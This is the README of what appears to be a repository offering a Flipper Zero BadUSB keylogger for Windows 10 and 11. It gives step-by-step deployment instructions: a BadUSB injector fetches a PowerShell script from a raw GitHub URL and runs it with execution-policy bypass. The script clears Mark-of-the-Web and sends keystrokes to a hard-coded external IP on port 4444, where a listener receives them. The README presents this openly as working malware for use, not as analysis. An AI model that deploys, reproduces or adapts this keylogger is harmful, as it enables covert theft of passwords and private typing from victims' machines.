# flipper-keylogger (Windows 10 / 11)

Flipper Zero BadUSB loads `keylogger.ps1` from this repo and sends keystrokes to **89.22.229.54:4444** (TCP).

Target: **Windows 10 and Windows 11**, Windows PowerShell **5.1** (built-in). No admin required.

| File | Role |
|------|------|
| `keylogger.ps1` | Key poll (ToUnicode + layout) + TCP exfil |
| `payload.txt` | BadUSB injector (visible window, 3s delays) |
| `payload_enc.txt` | Alternate encoded injector via `cmd start` |
| `server/receiver.py` | TCP listener (Linux VPS) |
| `server/receiver.ps1` | TCP listener (Windows) |

## Win10/11 adaptations

- Full path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` (avoids Windows Terminal / `pwsh` hijack on Win11)
- TLS 1.2 + TLS 1.3 when available
- Download: `WebClient` → `Invoke-WebRequest` fallback
- `Unblock-File` / clear Zone.Identifier (MOTW)
- TCP exfil forced **IPv4** (dual-stack stalls)
- Single-instance mutex (no process stack on re-run)
- `ToUnicodeEx` for current keyboard layout
- Banner includes OS caption + build + PS version

## Raw URL

```
https://raw.githubusercontent.com/naturalniyaboba2077/flipper-keylogger/main/keylogger.ps1
```

## Server

```bash
cd server
python3 receiver.py
# ufw allow 4444/tcp
# tail -f /opt/kl-recv/logs/live.log
```

## Flipper

1. Copy `payload.txt` → SD `badusb/`
2. Target: logged-in Win10/11, network on, layout **EN** for BadUSB typing
3. BadUSB → Run

All `DELAY` = **3000** ms for error screenshots.

## Local test

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -File .\keylogger.ps1
```

## Config

Top of `keylogger.ps1`: `$ServerIP`, `$ServerPort`, `$FlushEvery`, `$TimerMs`.

## Offline buffer

`%TEMP%\kl.buf` if TCP fails; retried every `$TimerMs`.
